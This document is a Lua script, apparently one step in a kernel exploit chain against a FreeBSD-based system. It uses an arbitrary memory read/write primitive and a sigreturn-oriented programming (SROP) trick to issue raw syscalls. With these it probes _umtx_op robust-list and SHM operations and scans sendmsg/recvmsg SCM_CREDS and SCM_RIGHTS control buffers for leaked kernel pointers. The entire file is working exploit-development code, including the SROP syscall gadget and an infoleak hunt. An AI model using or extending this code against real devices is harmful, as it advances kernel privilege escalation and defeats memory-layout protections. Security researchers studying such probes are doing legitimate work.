-- CRASH_CLASS: MODERATE
-- PROBE 142q: UMTX_OP_ROBUST_LISTS + recvmsg SCM_CREDS kernel data probe
--
-- UMTX_OP_ROBUST_LISTS (op=26) was NEVER tested on _umtx_op(454).
-- Previous probes used wrong syscall 557. This is the first real test.
-- Also: sendmsg/recvmsg with SCM_CREDS on socketpair to check for
-- kernel info leaks in cmsg control data padding.

print("=== PROBE 142q: ROBUST+CMSG ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

--------------------------------------------------------------------
-- [A] UMTX_OP_ROBUST_LISTS (op=26) on _umtx_op (sys 454)
-- First time this has EVER been tested on the real umtx_op.
-- FreeBSD struct umtx_robust_lists_params:
--   +0x00: robust_list_offset     (uintptr_t) 8 bytes
--   +0x08: robust_priv_list_offset (uintptr_t) 8 bytes
--   +0x10: robust_inact_offset    (uintptr_t) 8 bytes
-- Total = 24 bytes
-- _umtx_op(obj, op, val, uaddr, uaddr2)
-- obj = &params, op = 26, val = sizeof(params) = 24
--------------------------------------------------------------------
print("")
print("--- [A] UMTX_OP_ROBUST_LISTS (op=26) ---")

-- Set up robust list params
local params = gpu + 0x1000
-- For initial test, just set all offsets to 0
wq(params + 0x00, uint64(0))  -- robust_list_offset
wq(params + 0x08, uint64(0))  -- robust_priv_list_offset
wq(params + 0x10, uint64(0))  -- robust_inact_offset

-- Call _umtx_op(454) with op=26, val=24
local rv_rl = srop(454, ua(params), uint64(26), uint64(24), uint64(0), uint64(0))
local rlh, rll = get_hi_lo(rv_rl)
print("[A] robust_lists(op=26,val=24) ret=" .. hex(rv_rl))

if rll == 0 and rlh == 0 then
    print("[A] *** UMTX_OP_ROBUST_LISTS WORKS ON 454! ***")
end

-- Try with actual list addresses
-- Set up a robust list head in GPU memory
local robust_head = gpu + 0x2000
-- The "robust list" is a singly-linked list of futexes
-- robust_list_offset points to the head of the list
-- Each entry: next pointer, then at some offset the futex word
wq(robust_head, uint64(0))  -- list_head → NULL (empty list)

local params2 = gpu + 0x1100
wq(params2 + 0x00, ua(robust_head))  -- robust_list_offset = addr of list head
wq(params2 + 0x08, uint64(0))        -- no private list
wq(params2 + 0x10, uint64(0))        -- no inactive entry

local rv_rl2 = srop(454, ua(params2), uint64(26), uint64(24), uint64(0), uint64(0))
print("[A] robust_lists(with head) ret=" .. hex(rv_rl2))

-- Try val=0 (might register empty)
local rv_rl3 = srop(454, ua(params), uint64(26), uint64(0), uint64(0), uint64(0))
print("[A] robust_lists(val=0) ret=" .. hex(rv_rl3))

-- Try val=8 (partial)
local rv_rl4 = srop(454, ua(params), uint64(26), uint64(8), uint64(0), uint64(0))
print("[A] robust_lists(val=8) ret=" .. hex(rv_rl4))

--------------------------------------------------------------------
-- [B] UMTX_OP_SHM (op=25) on _umtx_op (sys 454)
-- Also never tested on the real 454. Creates/opens shared memory.
-- _umtx_op(key, 25, val, uaddr, uaddr2)
-- val determines operation: SHM_CREAT=1, SHM_LOOKUP=2, SHM_DESTROY=3
--------------------------------------------------------------------
print("")
print("--- [B] UMTX_OP_SHM (op=25) ---")

-- SHM create (val=1)
local shm_key = gpu + 0x3000
wq(shm_key, uint64(0x12345))  -- arbitrary key

local rv_shm1 = srop(454, ua(shm_key), uint64(25), uint64(1), uint64(0), uint64(0))
print("[B] umtx_shm(create,val=1) ret=" .. hex(rv_shm1))

-- SHM lookup (val=2)
local rv_shm2 = srop(454, ua(shm_key), uint64(25), uint64(2), uint64(0), uint64(0))
print("[B] umtx_shm(lookup,val=2) ret=" .. hex(rv_shm2))

-- SHM with zero key
local shm_key0 = gpu + 0x3100
wq(shm_key0, uint64(0))
local rv_shm3 = srop(454, ua(shm_key0), uint64(25), uint64(1), uint64(0), uint64(0))
print("[B] umtx_shm(create,key=0) ret=" .. hex(rv_shm3))

--------------------------------------------------------------------
-- [C] sendmsg/recvmsg with SCM_CREDS on socketpair
-- FreeBSD msghdr (64-bit):
--   +0x00: msg_name        (void*)    8
--   +0x08: msg_namelen     (socklen_t)4 + pad 4
--   +0x10: msg_iov         (iovec*)   8
--   +0x18: msg_iovlen      (int)      4 + pad 4
--   +0x20: msg_control     (void*)    8
--   +0x28: msg_controllen  (socklen_t)4
--   +0x2C: msg_flags       (int)      4
-- iovec:
--   +0x00: iov_base (void*) 8
--   +0x08: iov_len  (size_t) 8
-- cmsghdr:
--   +0x00: cmsg_len   (socklen_t) 4
--   +0x04: cmsg_level (int) 4
--   +0x08: cmsg_type  (int) 4
--   +0x0C: data...
--------------------------------------------------------------------
print("")
print("--- [C] recvmsg SCM_CREDS ---")

-- Create socketpair
local sp_fds = gpu + 0x4000
wd(sp_fds, 0xDEAD)
wd(sp_fds + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp_fds))
local fd_a = safe_rd(sp_fds)
local fd_b = safe_rd(sp_fds + 4)
print("[C] socketpair: " .. (fd_a or "nil") .. ", " .. (fd_b or "nil"))

if fd_a and fd_a ~= 0xDEAD then
    -- Build sendmsg structures for fd_a (sender)
    -- Send data + SCM_CREDS control message

    -- Data to send
    local send_data = gpu + 0x5000
    wd(send_data, 0x54534554)  -- "TEST"

    -- iovec for send
    local send_iov = gpu + 0x5100
    wq(send_iov + 0x00, ua(send_data))  -- iov_base
    wq(send_iov + 0x08, uint64(4))      -- iov_len

    -- Control message (SCM_CREDS)
    -- SOL_SOCKET = 0xFFFF, SCM_CREDS = 0x03
    -- cmsg_len for SCM_CREDS = CMSG_LEN(sizeof(cmsgcred))
    -- sizeof(cmsgcred) = 84, CMSG_LEN(84) = 16 + 84 = 100 (0x64)
    local send_cmsg = gpu + 0x5200
    wd(send_cmsg + 0x00, 100)      -- cmsg_len = 100
    wd(send_cmsg + 0x04, 0xFFFF)   -- cmsg_level = SOL_SOCKET
    wd(send_cmsg + 0x08, 0x03)     -- cmsg_type = SCM_CREDS

    -- msghdr for send
    local send_msg = gpu + 0x5300
    wq(send_msg + 0x00, uint64(0))       -- msg_name = NULL
    wd(send_msg + 0x08, 0)               -- msg_namelen = 0
    wq(send_msg + 0x10, ua(send_iov))    -- msg_iov
    wd(send_msg + 0x18, 1)               -- msg_iovlen = 1
    wq(send_msg + 0x20, ua(send_cmsg))   -- msg_control
    wd(send_msg + 0x28, 128)             -- msg_controllen
    wd(send_msg + 0x2C, 0)               -- msg_flags

    -- sendmsg(fd_a, &send_msg, 0) = sys 28
    local rv_send = srop(28, uint64(fd_a), ua(send_msg), uint64(0))
    print("[C] sendmsg ret=" .. hex(rv_send))

    -- Build recvmsg structures for fd_b (receiver)
    local recv_data = gpu + 0x6000
    for off = 0, 0xFF, 4 do wd(recv_data + off, 0) end

    local recv_iov = gpu + 0x6100
    wq(recv_iov + 0x00, ua(recv_data))  -- iov_base
    wq(recv_iov + 0x08, uint64(128))    -- iov_len

    -- Control buffer for receive — clear it completely, look for kernel data
    local recv_cmsg = gpu + 0x6200
    for off = 0, 0x1FF, 4 do wd(recv_cmsg + off, 0xAAAAAAAA) end  -- fill with sentinel

    local recv_msg = gpu + 0x6300
    wq(recv_msg + 0x00, uint64(0))       -- msg_name
    wd(recv_msg + 0x08, 0)               -- msg_namelen
    wq(recv_msg + 0x10, ua(recv_iov))    -- msg_iov
    wd(recv_msg + 0x18, 1)               -- msg_iovlen
    wq(recv_msg + 0x20, ua(recv_cmsg))   -- msg_control
    wd(recv_msg + 0x28, 512)             -- msg_controllen (large to catch all data)
    wd(recv_msg + 0x2C, 0)               -- msg_flags

    -- recvmsg(fd_b, &recv_msg, 0) = sys 27
    local rv_recv = srop(27, uint64(fd_b), ua(recv_msg), uint64(0))
    local rvvh, rvvl = get_hi_lo(rv_recv)
    print("[C] recvmsg ret=" .. hex(rv_recv))

    -- Check received data
    local rd0 = safe_rd(recv_data)
    print("[C] recv_data=0x" .. string.format("%08X", rd0 or 0))

    -- Dump cmsg control buffer
    local clen = safe_rd(recv_msg + 0x28)
    print("[C] msg_controllen=" .. (clen or "nil"))
    local cflags = safe_rd(recv_msg + 0x2C)
    print("[C] msg_flags=" .. (cflags or "nil"))

    print("[C] cmsg buffer dump:")
    local found_kernel = false
    for off = 0, 0x1FF, 4 do
        local v = safe_rd(recv_cmsg + off)
        if v and v ~= 0xAAAAAAAA and v ~= 0 then
            print("[C]  +" .. string.format("%03X", off) .. " = 0x" .. string.format("%08X", v))
        end
        -- Check for kernel pointers in qword values
        if off % 8 == 0 and off < 0x1FC then
            local vq = safe_rq(recv_cmsg + off)
            if vq then
                local qh, ql = get_hi_lo(vq)
                if qh >= 0xFFFF8000 then
                    print("[C]  *** KERNEL POINTER at +" .. string.format("%03X", off) .. ": " .. hex(vq) .. " ***")
                    found_kernel = true
                end
            end
        end
    end
    if not found_kernel then
        print("[C] No kernel pointers in cmsg buffer")
    end
end

--------------------------------------------------------------------
-- [D] recvmsg with SCM_RIGHTS — receive file descriptors
-- The kernel's fd passing code allocates internal structures.
-- Race potential: pass fds and close them simultaneously.
--------------------------------------------------------------------
print("")
print("--- [D] SCM_RIGHTS fd passing ---")

if fd_a and fd_a ~= 0xDEAD then
    -- Create another socketpair for the fd to pass
    local sp2 = gpu + 0x4010
    wd(sp2, 0xDEAD); wd(sp2 + 4, 0xDEAD)
    srop(135, uint64(1), uint64(1), uint64(0), ua(sp2))
    local pass_fd = safe_rd(sp2)
    print("[D] fd to pass: " .. (pass_fd or "nil"))

    if pass_fd and pass_fd ~= 0xDEAD then
        -- sendmsg with SCM_RIGHTS
        local sdata_d = gpu + 0x7000
        wd(sdata_d, 0x46445346)  -- "FSDF"

        local siov_d = gpu + 0x7100
        wq(siov_d + 0x00, ua(sdata_d))
        wq(siov_d + 0x08, uint64(4))

        -- cmsg for SCM_RIGHTS
        -- SOL_SOCKET = 0xFFFF, SCM_RIGHTS = 0x01
        -- cmsg_len = CMSG_LEN(sizeof(int)) = 16 + 4 = 20
        local scmsg_d = gpu + 0x7200
        wd(scmsg_d + 0x00, 20)        -- cmsg_len
        wd(scmsg_d + 0x04, 0xFFFF)    -- SOL_SOCKET
        wd(scmsg_d + 0x08, 0x01)      -- SCM_RIGHTS
        wd(scmsg_d + 0x0C, pass_fd)   -- the fd to pass (at CMSG_DATA offset)

        local smsg_d = gpu + 0x7300
        wq(smsg_d + 0x00, uint64(0))
        wd(smsg_d + 0x08, 0)
        wq(smsg_d + 0x10, ua(siov_d))
        wd(smsg_d + 0x18, 1)
        wq(smsg_d + 0x20, ua(scmsg_d))
        wd(smsg_d + 0x28, 24)   -- CMSG_SPACE(sizeof(int)) = 24
        wd(smsg_d + 0x2C, 0)

        local rv_sd = srop(28, uint64(fd_a), ua(smsg_d), uint64(0))
        print("[D] sendmsg(SCM_RIGHTS) ret=" .. hex(rv_sd))

        -- recvmsg on fd_b
        local rdata_d = gpu + 0x8000
        wd(rdata_d, 0)

        local riov_d = gpu + 0x8100
        wq(riov_d + 0x00, ua(rdata_d))
        wq(riov_d + 0x08, uint64(128))

        local rcmsg_d = gpu + 0x8200
        for off = 0, 0xFF, 4 do wd(rcmsg_d + off, 0xBBBBBBBB) end

        local rmsg_d = gpu + 0x8300
        wq(rmsg_d + 0x00, uint64(0))
        wd(rmsg_d + 0x08, 0)
        wq(rmsg_d + 0x10, ua(riov_d))
        wd(rmsg_d + 0x18, 1)
        wq(rmsg_d + 0x20, ua(rcmsg_d))
        wd(rmsg_d + 0x28, 256)
        wd(rmsg_d + 0x2C, 0)

        local rv_rd = srop(27, uint64(fd_b), ua(rmsg_d), uint64(0))
        print("[D] recvmsg(SCM_RIGHTS) ret=" .. hex(rv_rd))

        -- Check received fd
        local rcmsg_len = safe_rd(rcmsg_d + 0x00)
        local rcmsg_level = safe_rd(rcmsg_d + 0x04)
        local rcmsg_type = safe_rd(rcmsg_d + 0x08)
        local received_fd = safe_rd(rcmsg_d + 0x0C)
        print("[D] cmsg: len=" .. (rcmsg_len or "nil") .. " level=" .. (rcmsg_level or "nil") ..
              " type=" .. (rcmsg_type or "nil") .. " fd=" .. (received_fd or "nil"))

        if received_fd and received_fd ~= 0xBBBBBBBB then
            print("[D] *** SCM_RIGHTS FD PASSING WORKS! Received fd=" .. received_fd .. " ***")

            -- Dump rest of cmsg for any extra data
            print("[D] cmsg dump (beyond fd):")
            for off = 0x10, 0x3F, 4 do
                local v = safe_rd(rcmsg_d + off)
                if v and v ~= 0xBBBBBBBB and v ~= 0 then
                    print("[D]  +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
                end
            end

            -- Check for kernel pointers
            for off = 0, 0xFF, 8 do
                local vq = safe_rq(rcmsg_d + off)
                if vq then
                    local qh, ql = get_hi_lo(vq)
                    if qh >= 0xFFFF8000 then
                        print("[D] *** KERNEL PTR at +" .. string.format("%02X", off) .. ": " .. hex(vq) .. " ***")
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [E] UMTX_OP_WAIT_UINT_PRIVATE (op=15) + UMTX_OP_WAKE_PRIVATE (op=16)
-- Test private futex ops that may have different code paths
--------------------------------------------------------------------
print("")
print("--- [E] Private UMTX ops ---")

local priv_futex = gpu + 0x9000
wq(priv_futex, uint64(42))  -- set initial value

-- WAIT_UINT_PRIVATE with matching value (should wait/timeout)
-- But with val=42 matching, and no timeout → would block forever.
-- Set val to NON-matching value so it returns EWOULDBLOCK immediately
local rv_wait = srop(454, ua(priv_futex), uint64(15), uint64(99), uint64(0), uint64(0))
print("[E] WAIT_UINT_PRIVATE(val=99,actual=42) ret=" .. hex(rv_wait))
-- Should return non-zero since 42 != 99

-- WAKE_PRIVATE
local rv_wake = srop(454, ua(priv_futex), uint64(16), uint64(1), uint64(0), uint64(0))
print("[E] WAKE_PRIVATE(n=1) ret=" .. hex(rv_wake))

-- UMTX_OP_NWAKE_PRIVATE (op=17) — wake multiple addresses
local nwake_list = gpu + 0x9100
wq(nwake_list + 0x00, ua(priv_futex))

local rv_nwake = srop(454, ua(nwake_list), uint64(17), uint64(1), uint64(0), uint64(0))
print("[E] NWAKE_PRIVATE(n=1) ret=" .. hex(rv_nwake))

-- UMTX_OP_MUTEX_TRYLOCK (op=11)
local trylock_futex = gpu + 0x9200
wq(trylock_futex, uint64(0))  -- unowned

local rv_try = srop(454, ua(trylock_futex), uint64(11), uint64(0), uint64(0), uint64(0))
print("[E] MUTEX_TRYLOCK ret=" .. hex(rv_try))
local try_val = safe_rd(trylock_futex)
print("[E] trylock futex=" .. (try_val or "nil"))

if try_val and try_val ~= 0 then
    -- Unlock it
    local rv_unlock = srop(454, ua(trylock_futex), uint64(13), uint64(0), uint64(0), uint64(0))
    print("[E] MUTEX_UNLOCK ret=" .. hex(rv_unlock))
    local after_unlock = safe_rd(trylock_futex)
    print("[E] after unlock futex=" .. (after_unlock or "nil"))
end

print("")
print("=== DONE ===")
